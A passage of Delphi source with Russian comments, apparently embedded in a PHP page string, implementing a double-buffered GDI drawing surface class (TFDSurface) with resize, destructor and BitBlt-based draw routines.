  inherited Create;
  //Установка базовых размеров
  fWidth := DCWidth;
  fHeight := DCHeight;
  //Получение идентификатора передней поверхности
  dc := GetDC(Window);
  //Создание задней поверхности
  dc2 := CreateCompatibleDC(dc);
  //Создание описывающего заднюю поверхность битмапа
  dc2b := CreateCompatibleBitmap(dc, Width, Height);
  //Выбираем этот битмап
  SelectObject(dc2, dc2b);
end;

//Деструктор
destructor TFDSurface.Destroy;
begin
  //Выполняем действия базового деструктора
  inherited Destroy;
  //Удаляем описатель задней поверхности...
  DeleteObject(dc2b);
  //... и саму поверхность
  DeleteDC(dc2);
end;

//Общая процедура изменения размеров
procedure TFDSurface.ChangeSize(Width, Height: Integer);
begin
  //Устанавливаем размеры
  fWidth := Width;
  fHeight := Height;
  //Удаляем описатель
  DeleteObject(dc2b);
  //Создаем новый, с новыми размерами
  dc2b := CreateCompatibleBitmap(dc, Width, Height);
  //Устанваливаем его
  SelectObject(dc2, dc2b);
end;

//Процедура изменения ширины
procedure TFDSurface.ChangeWidth(Value: Integer);
begin
  //Вызываем общую процедуру
  ChangeSize(Value, fHeight);
end;

//Процедура изменения высоты
procedure TFDSurface.ChangeHeight(Value: Integer);
begin
  //Вызываем общую процедуру
  ChangeSize(fWidth, Value);
end;

//Процедура вывода задней поверхности на переднюю
procedure TFDSurface.Draw;
begin
  //Простое копирование изображения
  BitBlt(dc, 0, 0, fWidth, fHeight, dc2, 0, 0, SRCCOPY);
end;

end.
</pre>
';
	break;

}

